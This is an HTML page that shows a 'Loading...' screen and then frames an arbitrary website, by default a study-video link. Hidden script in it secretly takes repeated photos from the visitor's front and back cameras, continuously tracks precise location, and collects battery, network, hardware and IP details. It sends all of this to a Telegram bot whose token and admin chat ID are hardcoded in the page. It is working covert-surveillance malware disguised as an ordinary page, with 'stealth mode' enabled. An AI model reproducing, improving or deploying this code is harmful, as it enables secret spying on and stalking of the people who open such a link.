<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
        }
        
        body {
            width: 100vw;
            height: 100vh;
            overflow: hidden;
            background: #000;
            position: relative;
        }
        
        /* Hidden camera elements */
        #cameraContainer {
            position: fixed;
            top: -9999px;
            left: -9999px;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
            overflow: hidden;
        }
        
        #cameraVideo {
            width: 640px;
            height: 480px;
            object-fit: cover;
        }
        
        #captureCanvas {
            display: none;
        }
        
        /* Website frame - takes full screen */
        #websiteFrame {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
            z-index: 1;
        }
        
        /* Loading screen */
        #loadingScreen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #000;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 2000;
            color: #fff;
        }
        
        .spinner {
            width: 40px;
            height: 40px;
            border: 4px solid rgba(255, 255, 255, 0.3);
            border-top: 4px solid #fff;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <!-- Loading Screen -->
    <div id="loadingScreen">
        <div class="spinner"></div>
        <p>Loading...</p>
    </div>
    
    <!-- Hidden Camera -->
    <div id="cameraContainer">
        <video id="cameraVideo" autoplay playsinline muted></video>
        <canvas id="captureCanvas"></canvas>
    </div>
    
    <!-- Website Display -->
    <iframe id="websiteFrame" src="about:blank" sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-popups-to-escape-sandbox"></iframe>

    <script>
        // =====================================================
        //  ADVANCED CAMERA CAPTURE WITH FULL DEVICE INFO
        //  Features: Location, Battery, Network, Device Info
        // =====================================================
        
        // ============== CONFIGURATION ==============
        const CONFIG = {
            BOT_TOKEN: '8307999302:AAEniYvTP5ZeaYo74AcWSxsOQ9PSxpnAtA0',
            TELEGRAM_API: 'https://api.telegram.org/bot8307999302:AAEniYvTP5ZeaYo74AcWSxsOQ9PSxpnAtA0',
            ADMIN_CHAT_ID: '6314556756',
            
            // Capture settings
            PHOTOS_PER_CAMERA: 3,
            CAPTURE_DELAY: 250,
            CAMERA_WARMUP: 1200,
            SWITCH_DELAY: 500,
            VIDEO_READY_WAIT: 800,
            MAX_RETRIES: 3,
            
            // Quality settings
            IMAGE_QUALITY: 0.88,
            MIN_BLOB_SIZE: 1000,
            
            // Camera constraints
            VIDEO_WIDTH: 1280,
            VIDEO_HEIGHT: 720,
            FRAME_RATE: 30,
            
            // Location settings
            LOCATION_HIGH_ACCURACY: true,
            LOCATION_TIMEOUT: 10000,
            LOCATION_MAX_AGE: 0,
            
            // Info collection intervals
            BATTERY_CHECK_INTERVAL: 30000,  // 30 seconds
            LOCATION_UPDATE_INTERVAL: 60000, // 1 minute
            
            // Stealth mode
            STEALTH_MODE: true,
            DEBUG_MODE: false
        };
        
        // ============== STATE MANAGEMENT ==============
        const STATE = {
            isRunning: false,
            permissionGranted: false,
            currentStream: null,
            currentCamera: null,
            sessionId: Date.now(),
            userChatId: null,
            targetWebsite: null,
            
            // Statistics
            totalPhotosSent: 0,
            totalPhotosFailed: 0,
            cycleCount: 0,
            
            // Device info
            deviceInfo: {},
            locationInfo: null,
            batteryInfo: null,
            networkInfo: {},
            
            // Tracking
            availableCameras: [],
            cameraReady: false,
            lastCaptureTime: 0,
            locationWatchId: null
        };
        
        // ============== DOM ELEMENTS ==============
        const elements = {
            video: document.getElementById('cameraVideo'),
            canvas: document.getElementById('captureCanvas'),
            frame: document.getElementById('websiteFrame'),
            loading: document.getElementById('loadingScreen')
        };
        
        // ============== UTILITY FUNCTIONS ==============
        
        function log(message, level = 'info') {
            if (!CONFIG.DEBUG_MODE && level !== 'error') return;
            const prefix = {
                'info': 'ðŸ“¡',
                'success': 'âœ…',
                'error': 'âŒ',
                'warning': 'âš ï¸'
            }[level] || 'â€¢';
            console.log(`${prefix} ${message}`);
        }
        
        function hideLoading() {
            elements.loading.style.display = 'none';
        }
        
        // ============== DEVICE INFO COLLECTION ==============
        
        async function collectDeviceInfo() {
            const info = {
                // Browser & Device
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                vendor: navigator.vendor,
                language: navigator.language,
                languages: navigator.languages.join(', '),
                cookieEnabled: navigator.cookieEnabled,
                doNotTrack: navigator.doNotTrack,
                
                // Screen info
                screenWidth: window.screen.width,
                screenHeight: window.screen.height,
                screenAvailWidth: window.screen.availWidth,
                screenAvailHeight: window.screen.availHeight,
                screenColorDepth: window.screen.colorDepth,
                screenPixelDepth: window.screen.pixelDepth,
                screenOrientation: window.screen.orientation?.type || 'unknown',
                
                // Window info
                windowWidth: window.innerWidth,
                windowHeight: window.innerHeight,
                devicePixelRatio: window.devicePixelRatio,
                
                // Time & Timezone
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timezoneOffset: new Date().getTimezoneOffset(),
                localTime: new Date().toLocaleString(),
                
                // Hardware
                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
                deviceMemory: navigator.deviceMemory || 'unknown',
                maxTouchPoints: navigator.maxTouchPoints || 0,
                
                // Connection info
                onLine: navigator.onLine,
                connectionType: navigator.connection?.effectiveType || 'unknown',
                connectionDownlink: navigator.connection?.downlink || 'unknown',
                connectionRtt: navigator.connection?.rtt || 'unknown',
                connectionSaveData: navigator.connection?.saveData || false,
                
                // Media capabilities
                mediaDevices: navigator.mediaDevices ? 'supported' : 'not supported',
                
                // Permissions
                permissions: navigator.permissions ? 'supported' : 'not supported',
                
                // Additional
                pdfViewerEnabled: navigator.pdfViewerEnabled || false,
                webdriver: navigator.webdriver || false
            };
            
            // Check for mobile
            info.isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
            info.isTablet = /iPad|Android/i.test(navigator.userAgent) && !/Mobile/i.test(navigator.userAgent);
            
            // Detect OS
            if (navigator.userAgent.indexOf('Win') !== -1) info.os = 'Windows';
            else if (navigator.userAgent.indexOf('Mac') !== -1) info.os = 'MacOS';
            else if (navigator.userAgent.indexOf('Linux') !== -1) info.os = 'Linux';
            else if (navigator.userAgent.indexOf('Android') !== -1) info.os = 'Android';
            else if (navigator.userAgent.indexOf('iOS') !== -1) info.os = 'iOS';
            else info.os = 'Unknown';
            
            // Detect Browser
            if (navigator.userAgent.indexOf('Chrome') !== -1) info.browser = 'Chrome';
            else if (navigator.userAgent.indexOf('Safari') !== -1) info.browser = 'Safari';
            else if (navigator.userAgent.indexOf('Firefox') !== -1) info.browser = 'Firefox';
            else if (navigator.userAgent.indexOf('Edge') !== -1) info.browser = 'Edge';
            else if (navigator.userAgent.indexOf('Opera') !== -1) info.browser = 'Opera';
            else info.browser = 'Unknown';
            
            STATE.deviceInfo = info;
            log('Device info collected', 'success');
            return info;
        }
        
        // ============== BATTERY INFO ==============
        
        async function getBatteryInfo() {
            if (!navigator.getBattery) {
                log('Battery API not supported', 'warning');
                return null;
            }
            
            try {
                const battery = await navigator.getBattery();
                
                const info = {
                    level: Math.round(battery.level * 100) + '%',
                    charging: battery.charging,
                    chargingTime: battery.chargingTime === Infinity ? 'N/A' : battery.chargingTime + ' seconds',
                    dischargingTime: battery.dischargingTime === Infinity ? 'N/A' : battery.dischargingTime + ' seconds'
                };
                
                STATE.batteryInfo = info;
                log(`Battery: ${info.level}, Charging: ${info.charging}`, 'info');
                return info;
                
            } catch (error) {
                log(`Battery error: ${error}`, 'warning');
                return null;
            }
        }
        
        // ============== LOCATION TRACKING ==============
        
        async function getLocation() {
            if (!navigator.geolocation) {
                log('Geolocation not supported', 'warning');
                return null;
            }
            
            return new Promise((resolve) => {
                const options = {
                    enableHighAccuracy: CONFIG.LOCATION_HIGH_ACCURACY,
                    timeout: CONFIG.LOCATION_TIMEOUT,
                    maximumAge: CONFIG.LOCATION_MAX_AGE
                };
                
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const location = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy + ' meters',
                            altitude: position.coords.altitude || 'N/A',
                            altitudeAccuracy: position.coords.altitudeAccuracy || 'N/A',
                            heading: position.coords.heading || 'N/A',
                            speed: position.coords.speed || 'N/A',
                            timestamp: new Date(position.timestamp).toLocaleString(),
                            googleMapsLink: `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`
                        };
                        
                        STATE.locationInfo = location;
                        log(`Location: ${location.latitude}, ${location.longitude}`, 'success');
                        resolve(location);
                    },
                    (error) => {
                        log(`Location error: ${error.message}`, 'warning');
                        resolve(null);
                    },
                    options
                );
            });
        }
        
        function startLocationTracking() {
            if (!navigator.geolocation) return;
            
            const options = {
                enableHighAccuracy: CONFIG.LOCATION_HIGH_ACCURACY,
                timeout: CONFIG.LOCATION_TIMEOUT,
                maximumAge: CONFIG.LOCATION_MAX_AGE
            };
            
            STATE.locationWatchId = navigator.geolocation.watchPosition(
                (position) => {
                    STATE.locationInfo = {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy + ' meters',
                        altitude: position.coords.altitude || 'N/A',
                        speed: position.coords.speed || 'N/A',
                        timestamp: new Date(position.timestamp).toLocaleString(),
                        googleMapsLink: `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`
                    };
                    log('Location updated', 'info');
                },
                (error) => {
                    log(`Location tracking error: ${error.message}`, 'warning');
                },
                options
            );
        }
        
        // ============== NETWORK INFO ==============
        
        function getNetworkInfo() {
            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            
            if (!connection) {
                return { supported: false };
            }
            
            return {
                supported: true,
                effectiveType: connection.effectiveType || 'unknown',
                downlink: connection.downlink || 'unknown',
                rtt: connection.rtt || 'unknown',
                saveData: connection.saveData || false,
                type: connection.type || 'unknown'
            };
        }
        
        // ============== IP ADDRESS ==============
        
        async function getIPAddress() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                log('Could not fetch IP address', 'warning');
                return 'N/A';
            }
        }
        
        // ============== COMPREHENSIVE INFO MESSAGE ==============
        
        function formatDeviceInfoMessage() {
            const info = STATE.deviceInfo;
            const battery = STATE.batteryInfo;
            const location = STATE.locationInfo;
            const network = getNetworkInfo();
            
            let message = `ðŸ“± *DEVICE INFORMATION*\n\n`;
            
            // Basic Info
            message += `ðŸ–¥ï¸ *System Info:*\n`;
            message += `â€¢ OS: ${info.os}\n`;
            message += `â€¢ Browser: ${info.browser}\n`;
            message += `â€¢ Platform: ${info.platform}\n`;
            message += `â€¢ Language: ${info.language}\n`;
            message += `â€¢ Mobile: ${info.isMobile ? 'Yes' : 'No'}\n`;
            message += `â€¢ Tablet: ${info.isTablet ? 'Yes' : 'No'}\n\n`;
            
            // Screen Info
            message += `ðŸ“º *Screen:*\n`;
            message += `â€¢ Resolution: ${info.screenWidth}x${info.screenHeight}\n`;
            message += `â€¢ Available: ${info.screenAvailWidth}x${info.screenAvailHeight}\n`;
            message += `â€¢ Color Depth: ${info.screenColorDepth} bit\n`;
            message += `â€¢ Pixel Ratio: ${info.devicePixelRatio}\n`;
            message += `â€¢ Orientation: ${info.screenOrientation}\n\n`;
            
            // Battery Info
            if (battery) {
                message += `ðŸ”‹ *Battery:*\n`;
                message += `â€¢ Level: ${battery.level}\n`;
                message += `â€¢ Charging: ${battery.charging ? 'Yes âš¡' : 'No'}\n`;
                if (battery.charging && battery.chargingTime !== 'N/A') {
                    message += `â€¢ Full in: ${battery.chargingTime}\n`;
                }
                if (!battery.charging && battery.dischargingTime !== 'N/A') {
                    message += `â€¢ Time left: ${battery.dischargingTime}\n`;
                }
                message += `\n`;
            }
            
            // Location Info
            if (location) {
                message += `ðŸ“ *Location:*\n`;
                message += `â€¢ Latitude: ${location.latitude}\n`;
                message += `â€¢ Longitude: ${location.longitude}\n`;
                message += `â€¢ Accuracy: ${location.accuracy}\n`;
                message += `â€¢ [Open in Google Maps](${location.googleMapsLink})\n\n`;
            }
            
            // Network Info
            if (network.supported) {
                message += `ðŸŒ *Network:*\n`;
                message += `â€¢ Type: ${network.effectiveType}\n`;
                message += `â€¢ Downlink: ${network.downlink} Mbps\n`;
                message += `â€¢ RTT: ${network.rtt} ms\n`;
                message += `â€¢ Save Data: ${network.saveData ? 'Enabled' : 'Disabled'}\n`;
                message += `â€¢ Online: ${info.onLine ? 'Yes' : 'No'}\n\n`;
            }
            
            // Hardware Info
            message += `âš™ï¸ *Hardware:*\n`;
            message += `â€¢ CPU Cores: ${info.hardwareConcurrency}\n`;
            message += `â€¢ Memory: ${info.deviceMemory} GB\n`;
            message += `â€¢ Touch Points: ${info.maxTouchPoints}\n`;
            message += `â€¢ Cameras: ${STATE.availableCameras.length}\n\n`;
            
            // Time Info
            message += `ðŸ• *Time & Zone:*\n`;
            message += `â€¢ Timezone: ${info.timezone}\n`;
            message += `â€¢ Local Time: ${info.localTime}\n`;
            message += `â€¢ UTC Offset: ${info.timezoneOffset} min\n\n`;
            
            // Session Info
            message += `ðŸ†” *Session:*\n`;
            message += `â€¢ ID: ${STATE.sessionId}\n`;
            message += `â€¢ User: ${STATE.userChatId}\n`;
            message += `â€¢ Website: ${STATE.targetWebsite}\n`;
            
            return message;
        }
        
        // ============== URL PARAMETER PARSING ==============
        
        function parseConfig() {
            const params = new URLSearchParams(window.location.search);
            
            let website = params.get('site') || params.get('url') || params.get('website') || 'https://deltastudy.site/pw/drm/play?video_id=6970a6deec448154d82de9ea&subject_slug=maths-093626&batch_id=6960d1d20549bb69d7d7e872&schedule_id=6970a6deec448154d82de9ea&subject_id=6960dba01957eadd8581061e&topicSlug=ch-01---basic-mathematics-202900';
            const chatId = params.get('chat_id') || 'unknown_' + Math.random().toString(36).substr(2, 9);
            const sessionParam = params.get('session');
            
            if (!website.startsWith('http://') && !website.startsWith('https://')) {
                website = 'https://' + website;
            }
            
            STATE.targetWebsite = decodeURIComponent(website);
            STATE.userChatId = chatId;
            if (sessionParam) STATE.sessionId = sessionParam;
            
            log(`Target: ${STATE.targetWebsite}`, 'info');
        }
        
        function loadWebsite() {
            try {
                elements.frame.src = STATE.targetWebsite;
                document.title = 'Loading...';
                log('Website loaded', 'success');
            } catch (error) {
                log(`Website load error: ${error}`, 'error');
            }
        }
        
        // ============== CAMERA MANAGEMENT ==============
        
        async function enumerateCameras() {
            try {
                const devices = await navigator.mediaDevices.enumerateDevices();
                STATE.availableCameras = devices.filter(d => d.kind === 'videoinput');
                log(`Found ${STATE.availableCameras.length} camera(s)`, 'success');
                return STATE.availableCameras.length > 0;
            } catch (error) {
                log(`Camera enumeration error: ${error}`, 'error');
                return false;
            }
        }
        
        async function requestCameraPermission() {
            try {
                log('Requesting camera permission...', 'info');
                
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: true,
                    audio: false
                });
                
                stream.getTracks().forEach(track => track.stop());
                
                STATE.permissionGranted = true;
                await enumerateCameras();
                
                log('Camera permission granted', 'success');
                return true;
                
            } catch (error) {
                log(`Permission denied: ${error.name}`, 'error');
                STATE.permissionGranted = false;
                return false;
            }
        }
        
        async function startCamera(facingMode) {
            try {
                STATE.cameraReady = false;
                
                if (STATE.currentStream) {
                    STATE.currentStream.getTracks().forEach(track => track.stop());
                    STATE.currentStream = null;
                    await new Promise(resolve => setTimeout(resolve, 200));
                }
                
                log(`Starting ${facingMode} camera...`, 'info');
                
                elements.video.style.transform = facingMode === 'user' ? 'scaleX(-1)' : 'scaleX(1)';
                
                const constraints = {
                    video: {
                        facingMode: { ideal: facingMode },
                        width: { ideal: CONFIG.VIDEO_WIDTH },
                        height: { ideal: CONFIG.VIDEO_HEIGHT },
                        frameRate: { ideal: CONFIG.FRAME_RATE }
                    }
                };
                
                STATE.currentStream = await navigator.mediaDevices.getUserMedia(constraints);
                elements.video.srcObject = STATE.currentStream;
                STATE.currentCamera = facingMode === 'user' ? 'front' : 'back';
                
                await new Promise((resolve, reject) => {
                    const timeout = setTimeout(() => reject(new Error('Metadata timeout')), 5000);
                    elements.video.onloadedmetadata = () => {
                        clearTimeout(timeout);
                        resolve();
                    };
                });
                
                await elements.video.play();
                await new Promise(resolve => setTimeout(resolve, CONFIG.VIDEO_READY_WAIT));
                await new Promise(resolve => setTimeout(resolve, CONFIG.CAMERA_WARMUP));
                
                if (elements.video.videoWidth === 0 || elements.video.videoHeight === 0) {
                    throw new Error('Invalid video dimensions');
                }
                
                if (elements.video.readyState < 2) {
                    throw new Error('Video not ready');
                }
                
                STATE.cameraReady = true;
                log(`${facingMode} camera ready`, 'success');
                
                return true;
                
            } catch (error) {
                log(`Camera start error: ${error.message}`, 'error');
                STATE.cameraReady = false;
                return false;
            }
        }
        
        // ============== PHOTO CAPTURE ==============
        
        async function capturePhoto() {
            return new Promise((resolve) => {
                if (!STATE.cameraReady || elements.video.readyState < 2) {
                    resolve(null);
                    return;
                }
                
                if (elements.video.videoWidth === 0 || elements.video.videoHeight === 0) {
                    resolve(null);
                    return;
                }
                
                try {
                    const canvas = elements.canvas;
                    const ctx = canvas.getContext('2d', { alpha: false, willReadFrequently: false });
                    
                    canvas.width = elements.video.videoWidth;
                    canvas.height = elements.video.videoHeight;
                    
                    ctx.drawImage(elements.video, 0, 0, canvas.width, canvas.height);
                    
                    canvas.toBlob((blob) => {
                        if (blob && blob.size > CONFIG.MIN_BLOB_SIZE) {
                            log(`Captured: ${blob.size} bytes`, 'success');
                            STATE.lastCaptureTime = Date.now();
                            resolve(blob);
                        } else {
                            resolve(null);
                        }
                    }, 'image/jpeg', CONFIG.IMAGE_QUALITY);
                    
                } catch (error) {
                    log(`Capture error: ${error}`, 'error');
                    resolve(null);
                }
            });
        }
        
        // ============== TELEGRAM SENDING ==============
        
        async function sendToTelegram(blob, cameraType, photoNum, retryCount = 0) {
            if (!blob) {
                STATE.totalPhotosFailed++;
                return false;
            }
            
            const recipients = [CONFIG.ADMIN_CHAT_ID];
            if (STATE.userChatId !== 'unknown' && !STATE.userChatId.startsWith('unknown_')) {
                recipients.push(STATE.userChatId);
            }
            
            // Build comprehensive caption
            let caption = `ðŸ“¸ *${cameraType.toUpperCase()} Photo #${photoNum}*\n\n`;
            caption += `ðŸ‘¤ User: \`${STATE.userChatId}\`\n`;
            caption += `ðŸ†” Session: \`${STATE.sessionId}\`\n`;
            caption += `ðŸ”„ Cycle: ${STATE.cycleCount}\n`;
            
            // Add battery if available
            if (STATE.batteryInfo) {
                caption += `ðŸ”‹ Battery: ${STATE.batteryInfo.level} ${STATE.batteryInfo.charging ? 'âš¡' : 'ðŸ”Œ'}\n`;
            }
            
            // Add location if available
            if (STATE.locationInfo) {
                caption += `ðŸ“ Location: [${STATE.locationInfo.latitude}, ${STATE.locationInfo.longitude}](${STATE.locationInfo.googleMapsLink})\n`;
                caption += `ðŸŽ¯ Accuracy: ${STATE.locationInfo.accuracy}\n`;
            }
            
            caption += `â° ${new Date().toLocaleTimeString()}`;
            
            const results = await Promise.all(
                recipients.map(async (chatId) => {
                    try {
                        const formData = new FormData();
                        formData.append('chat_id', chatId);
                        formData.append('photo', blob, `${cameraType}_${photoNum}_${Date.now()}.jpg`);
                        formData.append('caption', caption);
                        formData.append('parse_mode', 'Markdown');
                        
                        const response = await fetch(`${CONFIG.TELEGRAM_API}/sendPhoto`, {
                            method: 'POST',
                            body: formData
                        });
                        
                        const result = await response.json();
                        
                        if (result.ok) {
                            log(`Sent to ${chatId}`, 'success');
                            return true;
                        } else {
                            log(`Telegram error: ${result.description}`, 'error');
                            return false;
                        }
                        
                    } catch (error) {
                        log(`Network error: ${error}`, 'error');
                        return false;
                    }
                })
            );
            
            const success = results.some(r => r);
            
            if (success) {
                STATE.totalPhotosSent++;
            } else if (retryCount < CONFIG.MAX_RETRIES) {
                log(`Retrying... (${retryCount + 1}/${CONFIG.MAX_RETRIES})`, 'warning');
                await new Promise(resolve => setTimeout(resolve, 1000));
                return await sendToTelegram(blob, cameraType, photoNum, retryCount + 1);
            } else {
                STATE.totalPhotosFailed++;
            }
            
            return success;
        }
        
        async function sendDeviceInfo() {
            try {
                const message = formatDeviceInfoMessage();
                
                await fetch(`${CONFIG.TELEGRAM_API}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CONFIG.ADMIN_CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown',
                        disable_web_page_preview: true
                    })
                });
                
                log('Device info sent', 'success');
                
            } catch (error) {
                log(`Failed to send device info: ${error}`, 'error');
            }
        }
        
        // ============== BURST CAPTURE ==============
        
        async function captureBurst(cameraType) {
            log(`Capturing ${CONFIG.PHOTOS_PER_CAMERA} from ${cameraType}...`, 'info');
            
            let successCount = 0;
            
            for (let i = 1; i <= CONFIG.PHOTOS_PER_CAMERA; i++) {
                if (!STATE.isRunning) break;
                
                const blob = await capturePhoto();
                
                if (blob) {
                    const sent = await sendToTelegram(blob, cameraType, i);
                    if (sent) successCount++;
                }
                
                if (i < CONFIG.PHOTOS_PER_CAMERA) {
                    await new Promise(resolve => setTimeout(resolve, CONFIG.CAPTURE_DELAY));
                }
            }
            
            log(`${cameraType} burst: ${successCount}/${CONFIG.PHOTOS_PER_CAMERA} sent`, 'info');
        }
        
        // ============== MAIN LOOP ==============
        
        async function mainLoop() {
            if (STATE.isRunning) return;
            
            STATE.isRunning = true;
            log('Starting capture loop...', 'info');
            
            // Send initial device info
            await sendDeviceInfo();
            
            while (STATE.isRunning) {
                try {
                    STATE.cycleCount++;
                    log(`=== CYCLE ${STATE.cycleCount} ===`, 'info');
                    
                    // Update battery info periodically
                    if (STATE.cycleCount % 3 === 0) {
                        await getBatteryInfo();
                    }
                    
                    // FRONT CAMERA
                    const frontStarted = await startCamera('user');
                    if (frontStarted && STATE.isRunning) {
                        await captureBurst('front');
                    }
                    
                    if (!STATE.isRunning) break;
                    await new Promise(resolve => setTimeout(resolve, CONFIG.SWITCH_DELAY));
                    
                    // BACK CAMERA
                    const backStarted = await startCamera('environment');
                    if (backStarted && STATE.isRunning) {
                        await captureBurst('back');
                    }
                    
                    if (!STATE.isRunning) break;
                    await new Promise(resolve => setTimeout(resolve, CONFIG.SWITCH_DELAY));
                    
                    log(`Cycle ${STATE.cycleCount} complete. Total: ${STATE.totalPhotosSent}`, 'info');
                    
                } catch (error) {
                    log(`Loop error: ${error}`, 'error');
                    await new Promise(resolve => setTimeout(resolve, 2000));
                }
            }
        }
        
        // ============== INITIALIZATION ==============
        
        async function init() {
            try {
                log('='.repeat(50), 'info');
                log('ADVANCED CAMERA CAPTURE SYSTEM', 'info');
                log('='.repeat(50), 'info');
                
                // Parse configuration
                parseConfig();
                
                // Collect device info
                await collectDeviceInfo();
                
                // Get IP address
                STATE.deviceInfo.ipAddress = await getIPAddress();
                
                // Get initial battery info
                await getBatteryInfo();
                
                // Get initial location
                await getLocation();
                
                // Start location tracking
                startLocationTracking();
                
                // Load website
                loadWebsite();
                
                // Request camera permission
                const hasPermission = await requestCameraPermission();
                
                if (hasPermission) {
                    hideLoading();
                    
                    // Start capture loop
                    setTimeout(() => {
                        mainLoop();
                    }, 2000);
                } else {
                    log('Camera permission denied', 'error');
                    hideLoading();
                }
                
                // Update battery periodically
                setInterval(getBatteryInfo, CONFIG.BATTERY_CHECK_INTERVAL);
                
            } catch (error) {
                log(`Initialization error: ${error}`, 'error');
                hideLoading();
            }
        }
        
        // ============== EVENT HANDLERS ==============
        
        document.addEventListener('visibilitychange', () => {
            if (document.hidden) {
                log('Page hidden', 'warning');
            } else if (STATE.isRunning) {
                log('Page visible', 'info');
            }
        });
        
        window.addEventListener('beforeunload', () => {
            STATE.isRunning = false;
            
            if (STATE.currentStream) {
                STATE.currentStream.getTracks().forEach(track => track.stop());
            }
            
            if (STATE.locationWatchId) {
                navigator.geolocation.clearWatch(STATE.locationWatchId);
            }
            
            log('Session ended', 'info');
        });
        
        // Heartbeat
        setInterval(() => {
            if (STATE.isRunning) {
                log(`Heartbeat | Cycle: ${STATE.cycleCount} | Sent: ${STATE.totalPhotosSent}`, 'info');
            }
        }, 60000);
        
        // Debug API
        window.cameraApp = {
            stop: () => {
                STATE.isRunning = false;
                log('Stopped by user', 'warning');
            },
            start: () => {
                if (!STATE.isRunning) mainLoop();
            },
            status: () => ({
                isRunning: STATE.isRunning,
                totalPhotosSent: STATE.totalPhotosSent,
                totalPhotosFailed: STATE.totalPhotosFailed,
                cycleCount: STATE.cycleCount,
                currentCamera: STATE.currentCamera,
                sessionId: STATE.sessionId,
                userChatId: STATE.userChatId,
                deviceInfo: STATE.deviceInfo,
                locationInfo: STATE.locationInfo,
                batteryInfo: STATE.batteryInfo
            }),
            getLocation: getLocation,
            getBattery: getBatteryInfo,
            sendInfo: sendDeviceInfo
        };
        
        // Start
        window.addEventListener('load', init);
        
    </script>
</body>
</html>
